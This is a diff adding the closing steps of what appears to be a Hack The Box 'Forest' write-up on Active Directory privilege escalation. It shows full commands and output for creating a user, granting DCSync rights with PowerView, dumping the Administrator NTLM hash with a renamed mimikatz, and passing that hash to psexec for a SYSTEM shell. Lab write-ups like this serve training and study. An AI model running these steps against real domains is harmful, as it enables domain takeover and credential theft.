@@ -11654,9 +11654,9 @@ Map the shortest path to Domain Admin from the owned account.
 The owned account is an inherent member of the account operators group which has GenericAll privileges to the Exchange Windows Permissions group, which has WriteDACL permissions to the domain.
 Abuse info from BloodHound:
   
-*To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.
+*To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.*
   
-You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):*
+*You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):*
 ```shell
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
@@ -11672,4 +11672,96 @@ lsadump::dcsync /domain:testlab.local /user:Administrator
 *Cleanup can be done using the Remove-DomainObjectAcl function:*
 ```shell
 Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+```
+Another reference: https://adsecurity.org/?p=3658
+
+### 6. Grant DCSync to account
+Set up PowerView:
+```shell
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerSploit/Recon/PowerView.ps1
+Info: Uploading PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1
+
+                                                             
+Data: 1027036 bytes of 1027036 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
+```
+First create a new account that can be modified.
+```shell
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user jack password123 /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add jack
+The command completed successfully.
+```
+Next, add DCSync rights the the user.
+```shell
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\jack', $SecPassword)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=HTB,DC=local' -PrincipalIdentity jack -Rights DCSync
+```
+In order to log in as the modified user I can also add the user to the "Remote Management Users" group.
+```shell
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" /add jack
+The command completed successfully.
+```
+
+### 7. Get Admin credentials
+Log in as the "jack" user, upload and use mimikatz to dump admin hash.
+```shell
+*Evil-WinRM* PS C:\Users\jack\Documents> .\meow.exe "lsadump::dcsync /domain:htb.local /user:Administrator" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /domain:htb.local /user:Administrator
+[DC] 'htb.local' will be the domain
+[DC] 'FOREST.htb.local' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+User Principal Name  : Administrator@htb.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 9/18/2019 9:09:08 AM
+Object Security ID   : S-1-5-21-3072663084-364016917-1341370565-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+### 8. Get a SYSTEM shell
+From here, use psexec to elevate to SYSTEM remotely.
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[/usr/share/doc/python3-impacket/examples]
+└──╼ [★]$ python3 psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 HTB.local/Administrator@10.129.72.52
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.72.52.....
+[*] Found writable share ADMIN$
+[*] Uploading file QwKEmDQw.exe
+[*] Opening SVCManager on 10.129.72.52.....
+[*] Creating service GcVg on 10.129.72.52.....
+[*] Starting service GcVg.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
 ```
